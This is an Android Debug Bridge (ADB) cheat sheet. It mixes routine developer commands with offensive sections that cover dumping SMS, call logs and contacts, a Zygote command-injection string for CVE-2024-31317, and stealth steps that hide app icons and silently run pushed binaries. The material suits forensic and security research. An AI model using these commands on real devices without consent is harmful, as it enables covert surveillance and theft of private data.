# 📱 The Ultimate ADB Technical Cheat Sheet (2026 Edition)

This comprehensive guide covers standard Android Debug Bridge (ADB) operations, advanced exploitation, forensic techniques, and deep system diagnostics.

---

## 🛠️ 1. Core Connection & Management
| Command | Description |
| :--- | :--- |
| `adb devices -l` | List connected devices with detailed model/product info. |
| `adb connect [IP]:[PORT]` | Connect to a device over Wi-Fi (Default port: 5555). |
| `adb disconnect` | Disconnect from all wireless devices. |
| `adb kill-server` | Terminate the ADB background process. |
| `adb start-server` | Manually start the ADB background process. |
| `adb -s [SERIAL] [CMD]` | Execute command on a specific device. |
| `adb wait-for-device` | Block execution until a device is connected. |

---

## 📂 2. File & Application Operations
| Command | Description |
| :--- | :--- |
| `adb push [LOCAL] [REMOTE]` | Copy file to device (e.g., `/data/local/tmp/`). |
| `adb pull [REMOTE] [LOCAL]` | Copy file from device to your machine. |
| `adb install [-r] [-g] [APK]` | Install APK (`-r` reinstall, `-g` grant all permissions). |
| `adb uninstall [PKG_NAME]` | Remove an application. |
| `adb shell pm list packages -f` | List all installed packages and their file paths. |
| `adb shell pm path [PKG_NAME]` | Find the path to a specific APK. |
| `adb shell pm clear [PKG_NAME]` | Wipe all data associated with an app. |

---

## 🔍 3. Advanced Reconnaissance (Shell Commands)
| Command | Description |
| :--- | :--- |
| `adb shell getprop` | Dump all system properties (Model, SDK, Kernel, etc.). |
| `adb shell uname -a` | Show kernel version and architecture (e.g., `aarch64`). |
| `adb shell dumpsys battery` | Check battery status and level. |
| `adb shell dumpsys activity top` | Identify the currently active (foreground) application. |
| `adb shell pm list users` | List all user profiles on the device. |
| `adb shell netstat -antp` | List active network connections and listening ports. |
| `adb shell ip addr show` | View local IP addresses and network interfaces. |
| `adb shell dumpsys semprivilege` | (Samsung) Dump Samsung-specific privilege settings. |

---

## 🕵️ 4. Data Exfiltration (Content Providers)
*Requires appropriate permissions or root access.*
| Command | Description |
| :--- | :--- |
| `adb shell content query --uri content://sms/inbox` | Dump all received SMS messages. |
| `adb shell content query --uri content://call_log/calls` | Dump full call history. |
| `adb shell content query --uri content://contacts/phones` | Dump contact list with phone numbers. |
| `adb shell content query --uri content://settings/global` | Dump global system settings. |

---

## 🚀 5. Exploitation & Advanced Interaction
| Command | Description |
| :--- | :--- |
| `adb root` | Restart `adbd` with root permissions (Production builds usually fail). |
| `adb shell am start -n [PKG]/[ACT]` | Force start a specific Activity (e.g., Settings). |
| `adb shell am force-stop [PKG]` | Kill an application process immediately. |
| `adb shell input tap [X] [Y]` | Simulate a screen tap at coordinates. |
| `adb shell input text "[STRING]"` | Simulate keyboard input. |
| `adb shell settings put global [KEY] [VAL]` | Modify system-wide settings. |
| `adb forward tcp:[LOCAL] tcp:[REMOTE]` | Forward a local port to a device port. |
| `adb reverse tcp:[REMOTE] tcp:[LOCAL]` | Reverse forward (C2 callback strategy). |

---

## 📋 6. Logcat: System Logging & Debugging
| Command | Description |
| :--- | :--- |
| `adb logcat` | Start streaming real-time logs (Ctrl+C to stop). |
| `adb logcat -c` | Clear (flush) all logs on the device. |
| `adb logcat -d > log.txt` | Dump current logs to a local file and exit. |
| `adb logcat -v threadtime` | Shows Date, Time, PID, TID, Priority, and Tag. |
| `adb logcat *:E` | Filter to only show **Error** priority and above. |
| `adb logcat --pid=[PID]` | Filter logs for a specific Process ID. |
| `adb shell dmesg` | View kernel-level logs (useful for LPE/Crash analysis). |

**Priority Levels:** `V` (Verbose), `D` (Debug), `I` (Info), `W` (Warning), `E` (Error), `F` (Fatal), `S` (Silent)

---

## 🏗️ 7. Dumpsys: System Service Diagnostics
| Command | Description |
| :--- | :--- |
| `adb shell dumpsys -l` | List all available system services to query. |
| `adb shell dumpsys activity top` | Show detailed state of the foreground activity. |
| `adb shell dumpsys package [PKG]` | View permissions, versions, and **DEBUGGABLE** flags. |
| `adb shell dumpsys meminfo [PKG]` | Detailed RAM usage breakdown for an app. |
| `adb shell dumpsys battery` | View health, voltage, and temperature. |
| `adb shell dumpsys wifi` | Dump Wi-Fi state (SSID, Signal, nearby APs). |
| `adb shell dumpsys procstats` | Process statistics and history. |

---

## 🧪 8. SuperSploit Specialized Research (June 2026)

**Master Key Bypass (CVE-2026-0073):**
*   **Vulnerability:** Logic error in `adbd_tls_verify_cert` allowing zero-click RCE.
*   **Target:** Adjacent attackers can impersonate authorized devices over Wireless ADB.

**Zygote Injection (CVE-2024-31317):**
*   **Command:** `adb shell settings put global hidden_api_blacklist_exemptions "L;\\n[CMD]"`
*   **Mechanism:** Injects commands into Zygote via a newline in global settings.

**Samsung AT Command Fuzzing:**
*   **Interface:** `/dev/ttyACM0`
*   **Commands:** `AT+FACMODE=1`, `AT+KNOXSTEP=1`, `AT+ACTIBLEAD`.

---

## 🛡️ 9. Stealth & Persistence
- **Hide App Icon:** `adb shell pm disable [PKG_NAME]/[LAUNCHER_ACTIVITY]`
- **Silent Deployment:** `adb push [ELF] /data/local/tmp && adb shell chmod +x [ELF] && adb shell ./[ELF] &`
- **Wakelocks:** Prevent sleep during exfiltration using `dumpsys power`.

---

## ⚙️ 10. Operational Workflow Summary
1.  **Monitor Crashes:** `adb logcat -v threadtime | grep -i "FATAL EXCEPTION"`
2.  **Verify LPE Surface:** `adb shell dumpsys package [PKG] | grep -E "flags|userId"`
3.  **Identify Active App:** `adb shell dumpsys activity top | grep "ACTIVITY"`
4.  **Extract Sandbox Path:** `adb shell dumpsys package [PKG] | grep "dataDir"`
